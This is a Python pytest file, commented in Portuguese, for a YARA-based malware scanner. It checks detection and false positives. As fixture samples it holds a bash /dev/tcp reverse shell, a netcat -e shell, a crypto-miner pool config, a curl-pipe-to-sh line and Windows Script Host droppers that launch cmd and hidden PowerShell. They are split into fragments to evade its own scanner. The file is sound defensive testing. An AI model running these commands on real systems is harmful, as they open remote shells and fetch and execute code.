import pytest

pytest.importorskip("yara_x")

from guarnicao import regras_yara, scanner

# Amostras montadas em pedaços para este arquivo de teste não ser, ele mesmo,
# detectado ao varrer o projeto. Usa join() porque literais adjacentes ("a" "b")
# são unidos pelo compilador e reapareceriam inteiros no .pyc.
REVERSE_SHELL = "".join(["#!/bin/bash\nbash -i >& /dev/", "tcp/10.0.0.1/4444 0>&1\n"])
NETCAT = "".join(["nc 10.0.0.1 4444 -e /bin/", "sh\n"])
MINERADOR = "".join(['{"url": "stratum+', 'tcp://pool.exemplo.com:3333", "user": "carteira"}'])
CURL_SH = "".join(["#!/bin/sh\ncurl -fsSL https://exemplo.com/install.sh |", " sh\n"])


@pytest.fixture(scope="module")
def yara():
    return regras_yara.carregar()


def analisar(tmp_path, nome, conteudo, yara):
    arquivo = tmp_path / nome
    if isinstance(conteudo, bytes):
        arquivo.write_bytes(conteudo)
    else:
        arquivo.write_text(conteudo)
    return scanner.analisar(arquivo, {}, yara)


def test_reverse_shell_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "atualizar.sh", REVERSE_SHELL, yara)
    assert r.ameaca == "ReverseShell_DevTcp (YARA)"


def test_netcat_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "run.sh", NETCAT, yara)
    assert r.ameaca == "ReverseShell_Netcat (YARA)"


def test_minerador_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "config.json", MINERADOR, yara)
    assert r.ameaca == "MineradorCripto (YARA)"


def test_curl_pipe_sh_e_suspeito(tmp_path, yara):
    r = analisar(tmp_path, "setup.sh", CURL_SH, yara)
    assert not r.infectado and r.suspeito
    assert any("DownloadEExecuta" in m for m in r.motivos)


def test_curl_pipe_sh_em_documentacao_nao_e_suspeito(tmp_path, yara):
    # READMEs e manuais ensinam a instalar assim; sem "#!" não é um script.
    texto = "## Instalação\n\n" + CURL_SH.removeprefix("#!/bin/sh\n")
    for nome in ("README.md", "installation.html", "METADATA"):
        assert not analisar(tmp_path, nome, texto, yara).suspeito


def test_elf_upx_e_suspeito(tmp_path, yara):
    r = analisar(tmp_path, "programa", b"\x7fELF" + b"\x00" * 100 + b"UPX!" + b"\x00" * 100, yara)
    assert r.suspeito
    assert any("ELF_EmpacotadoUPX" in m for m in r.motivos)


def test_script_comum_passa_limpo(tmp_path, yara):
    r = analisar(tmp_path, "backup.sh", "#!/bin/bash\ntar czf backup.tgz ~/docs\necho pronto\n", yara)
    assert not r.infectado and not r.suspeito


def test_nao_detecta_as_proprias_regras(yara):
    resultados = list(scanner.varrer(regras_yara.PASTA_PADRAO.parent, {}, yara))
    assert not any(getattr(r, "infectado", False) for r in resultados)



# Regras de mentira, no formato da YARA Forge (score + description em inglês).
REGRAS_DA_BASE = """
rule Comunidade_Malware { meta: score = 85 description = "known family" strings: $a = "MARCA-FAMILIA" condition: $a }
rule Comunidade_Generica { meta: score = 70 description = "generic pattern" strings: $a = "MARCA-GENERICA" condition: $a }
"""


def regras_de_base(pasta, texto):
    arquivo = pasta / "base-teste" / "versoes" / "v1" / "regras.yar"
    arquivo.parent.mkdir(parents=True)
    arquivo.write_text(texto)
    return arquivo


@pytest.fixture
def com_base(tmp_path, monkeypatch):
    def usar(texto):
        arquivo = regras_de_base(tmp_path / "bases", texto)
        monkeypatch.setattr(regras_yara, "regras_das_bases", lambda: [arquivo])
        return regras_yara.carregar()
    return usar


def test_regras_da_base_usam_o_score(tmp_path, com_base):
    yara = com_base(REGRAS_DA_BASE)
    malware = analisar(tmp_path, "a.bin", "xx MARCA-FAMILIA yy", yara)
    generica = analisar(tmp_path, "b.bin", "xx MARCA-GENERICA yy", yara)
    assert malware.infectado and "Comunidade_Malware" in malware.ameaca
    assert not generica.infectado and generica.suspeito
    assert any("generic pattern" in m for m in generica.motivos)


def test_regra_desligada_e_ignorada(tmp_path, com_base, monkeypatch):
    desligadas = tmp_path / "desligadas.txt"
    desligadas.write_text("Comunidade_Malware   # falso positivo num jogo\n")
    monkeypatch.setattr(regras_yara, "DESLIGADAS", desligadas)
    monkeypatch.setattr(regras_yara, "_cache_desligadas", None)
    assert not analisar(tmp_path, "a.bin", "xx MARCA-FAMILIA yy", com_base(REGRAS_DA_BASE)).infectado


def test_base_quebrada_nao_derruba_as_nossas_regras(tmp_path, com_base):
    assert analisar(tmp_path, "atualizar.sh", REVERSE_SHELL, com_base("rule { quebrada")).infectado


def test_validar_fonte(tmp_path):
    assert regras_yara.validar_fonte(regras_de_base(tmp_path / "boa", REGRAS_DA_BASE)) == 2
    with pytest.raises(Exception):
        regras_yara.validar_fonte(regras_de_base(tmp_path / "ruim", "rule { quebrada"))


# --- JavaScript para o Windows Script Host ----------------------------------

DROPPER_JS = "".join(['var s = new ActiveXObject("WScript.', 'Shell");\n', 's.Run("cmd /c start x.exe", 0);\n'])
CHAMA_PS_JS = "".join(["var w = WScript.", "CreateObject('Shell.Application');\n",
                         "w.ShellExecute('power", "shell', '-w hidden -c iex x', '', 'open', 0);\n"])
ESCONDIDOS_JS = "var p = WScript.ScriptFullName;\n" + "".join(
    f"var o{i} = new Active" + f"XObject(QWERTYUIOPASD{i});\n" for i in range(4))
JQUERY_ANTIGO = """\
function createActiveXHR() {
    try { return new window.ActiveXObject("Microsoft.XMLHTTP"); } catch (e) {}
}
var dados = "data:image/png;base64,""" + "A" * 4000 + '";\n'


# Nomes montados com join() e ids curtos: o .pytest_cache guarda os ids, e
# o nome de uma regra mais um objeto do WSH no mesmo arquivo bastam para disparar.
@pytest.mark.parametrize("conteudo, regra", [
    (DROPPER_JS, "JS_WSH_RodaComando"),
    (CHAMA_PS_JS, "".join(["JS_WSH_Power", "Shell"])),
    (ESCONDIDOS_JS, "JS_WSH_ObjetosEscondidos"),
], ids=["roda-comando", "chama-ps", "objetos-escondidos"])
def test_dropper_js_e_ameaca(tmp_path, yara, conteudo, regra):
    r = analisar(tmp_path, "fatura.js", conteudo, yara)
    assert r.ameaca == f"{regra} (YARA)"


def test_dropper_js_em_utf16_tambem(tmp_path, yara):
    # O WSH roda scripts UTF-16 (BOM FF FE); cada letra vira dois bytes.
    r = analisar(tmp_path, "nota.js", b"\xff\xfe" + DROPPER_JS.encode("utf-16-le"), yara)
    assert r.ameaca == "JS_WSH_RodaComando (YARA)"


def test_js_de_site_com_activex_nao_dispara(tmp_path, yara):
    # Biblioteca antiga com o XMLHttpRequest do Internet Explorer e uma imagem embutida.
    r = analisar(tmp_path, "jquery-1.4.js", JQUERY_ANTIGO, yara)
    assert not r.infectado and not r.suspeito


def test_binario_que_cita_o_wsh_nao_dispara(tmp_path, yara):
    # Como o wscript.exe do Wine ou uma DLL .NET: o texto está lá, mas é um programa.
    binario = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 64 + DROPPER_JS.encode()
    r = analisar(tmp_path, "wscript.exe", binario, yara)
    assert not r.infectado


def test_registro_do_wine_nao_dispara(tmp_path, yara):
    registro = "".join(['[Software\\\\Classes\\\\WScript.', 'Shell] 1700000000\n',
                        '"Path"="C:\\\\windows\\\\system32\\\\WindowsPower', 'Shell\\\\v1.0"\n'])
    r = analisar(tmp_path, "system.reg", registro, yara)
    assert not r.infectado and not r.suspeito


def test_biblioteca_web_que_testa_o_ambiente_nao_dispara(tmp_path, yara):
    # Como o rx.lite.min.js: testa se roda no WSH e é minificado (aspas longe umas das outras).
    minificado = "".join(['typeof WScript!="undefined"&&WScript.', 'Sleep(1);var a="', "x=1;" * 1000, '"'])
    r = analisar(tmp_path, "rx.lite.min.js", minificado, yara)
    assert not r.infectado and not r.suspeito


def test_realce_de_sintaxe_com_activex_nao_dispara(tmp_path, yara):
    # Como o Swagger UI: XMLHttpRequest do IE e a lista de linguagens do highlight.js.
    swagger = "".join(['try{x=new Active', 'XObject("Microsoft.XMLHTTP")}catch(e){}\n',
                       'registerLanguage("power', 'shell", ps);\n'])
    r = analisar(tmp_path, "swagger.js", swagger, yara)
    assert not r.infectado


# Arquivo de regras de outra ferramenta (ex.: o skillspector traz cryptominers.yar):
# ele contém os textos que procura, mas não é um minerador.
REGRA_DE_OUTRA_FERRAMENTA = "".join([
    'rule Minerador\n{\n    strings:\n        $pool = "stratum+', 'tcp://" nocase\n',
    '        $xm = "xmr', 'ig"\n    condition:\n        any of them\n}\n'])


def test_arquivo_de_regras_yara_nao_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "cryptominers.yar", REGRA_DE_OUTRA_FERRAMENTA, yara)
    assert not r.infectado and not r.suspeito


def test_minerador_com_nome_de_regra_continua_ameaca(tmp_path, yara):
    # Só o nome .yar não basta: o conteúdo tem que ser uma regra de verdade.
    r = analisar(tmp_path, "config.yar", MINERADOR, yara)
    assert r.ameaca == "MineradorCripto (YARA)"


@pytest.mark.parametrize("pasta", ["go/pkg/mod/exemplo.com/lib@v1.0.0/scripts",
                                   ".cache/pip/wheels/2f", ".cache/uv/archive-v0/x",
                                   ".cargo/registry/src/x", ".npm/_cacache/x"])
def test_script_de_programador_no_cache_de_pacotes_nao_e_suspeito(tmp_path, yara, pasta):
    (tmp_path / pasta).mkdir(parents=True)
    r = analisar(tmp_path / pasta, "install.sh", CURL_SH, yara)
    assert not r.infectado and not r.suspeito


def test_ameaca_no_cache_de_pacotes_continua_ameaca(tmp_path, yara):
    pasta = tmp_path / "go/pkg/mod/exemplo.com/lib@v1.0.0"
    pasta.mkdir(parents=True)
    r = analisar(pasta, "atualizar.sh", REVERSE_SHELL, yara)
    assert r.ameaca == "ReverseShell_DevTcp (YARA)"
